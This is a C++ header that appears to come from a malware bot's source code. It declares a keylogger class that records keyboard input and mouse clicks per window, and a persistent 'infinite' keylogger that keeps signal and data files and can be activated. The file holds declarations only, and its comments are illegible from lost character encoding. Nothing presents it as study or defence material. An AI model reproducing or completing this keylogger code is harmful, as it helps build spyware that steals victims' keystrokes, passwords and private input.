//---------------------------------------------------------------------------

#ifndef KeyLoggerH
#define KeyLoggerH
//---------------------------------------------------------------------------

#include <Windows.h>

#include "GetApi.h"
#include "Strings.h"



//********************************************************
//   TKeyLogger - ������� ����� ��������
//********************************************************
class TKeyLogger : public TBotObject
{
public:
	TKeyLogger();
	virtual ~TKeyLogger();

	// ������� ���������� ��� �� ����������
	bool WriteKeyboard(HWND Wnd, const char* Text);

	// ������� ���������� ��� �� ����
	bool WriteMouse(HWND Wnd, int X, int Y, int Button);


};




//********************************************************
//  TInfiniteKeyLogger - ����� ������������ �����������
//                       ����� � ����������. ����� �����-
//  ����� ��������� �� ��� ��������. ������ ������� �
//  ����� ��������� ����.
//
//********************************************************

class TInfiniteKeyLogger : public TBotObject
{
private:
	string FSignalFile;
	string FDataFile;

	string static GetSignalFileName();
public:
	TInfiniteKeyLogger();
	~TInfiniteKeyLogger();

	//--------------------------------------------
	//  Activate - ������� ���������� ����������
	//             ��������
	//--------------------------------------------
	bool static Activate();

	//--------------------------------------------
	//  Activated - ������� ���������� ������ ����
	//             �������� �����������
	//--------------------------------------------
	bool static Activated();
};


//---------------------------------------------------------------------------
#endif
